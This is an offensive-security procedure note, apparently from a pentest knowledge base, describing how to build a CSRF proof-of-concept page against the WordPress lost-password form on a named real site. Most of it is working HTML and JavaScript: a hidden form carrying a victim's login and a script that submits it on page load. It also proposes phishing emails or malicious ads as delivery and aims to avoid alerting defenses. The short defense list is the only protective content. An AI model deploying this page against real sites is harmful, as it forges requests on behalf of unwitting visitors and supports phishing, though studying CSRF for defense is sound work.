---
tags:
  - csrf
  - poc
  - html-exploit
  - wordpress
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: beginner
impact_level: low
detection_risk: low
sub_techniques: []
id: 88e023e9-caf7-4e25-bc6d-08511ad9dedd
created_at: '2025-12-14T17:27:03.658Z'
updated_at: '2025-12-14T17:27:03.658Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-CSRF-Proof-of-Concept-HTML-Page

## Summary

This procedure guides the creation of a malicious HTML page that auto-submits a forged password reset request to the vulnerable WordPress lost password form, demonstrating CSRF exploitation.

## Description

The PoC mimics the original form's POST request to https://nextcloud.com/wp-login.php?action=lostpassword using the user_login parameter, without any CSRF token. JavaScript is used for automatic submission upon page load, tricking a victim into initiating the request via a simple page visit. This is effective against unauthenticated users and highlights the vulnerability's exploitability in a real-world scenario like phishing emails or malicious ads.

## Requirements

1. Text editor (e.g., VS Code or Notepad)
2. Knowledge of basic HTML and JavaScript
3. Target endpoint details from prior inspection

## Defense

Defensive measures and detection strategies:

- Enforce same-origin policy and validate referer headers
- Educate users on phishing and unexpected form submissions
- Log and alert on rapid or anomalous reset requests

## Objectives

1. Build a functional auto-submitting HTML form
2. Ensure it targets the exact vulnerable parameters
3. Prepare for demonstration without alerting defenses

## Instructions

### Step 1: Create Basic HTML Structure

**Context**: Set up the form to match the target's action and method.

Create a new file named submit.html with the following:

```html
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<form id="csrf-form" action="https://nextcloud.com/wp-login.php?action=lostpassword" method="POST">
<input type="hidden" name="user_login" value="victim@example.com">
</form>
</body>
</html>
```

> This defines the hidden form with the target parameter.

### Step 2: Add Auto-Submission Script

**Context**: Use JavaScript to submit the form immediately on load.

Add this script before the closing </body> tag:

```html
<script>document.getElementById('csrf-form').submit();</script>
```

> Expected: Form submits on page open, sending the request.

### Step 3: Test Locally

**Context**: Verify the PoC structure before deployment.

Open submit.html in a browser and check network tab for the POST request.

> Success: Request sent to target without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[proof-of-concept]]
- [[web-exploit]]
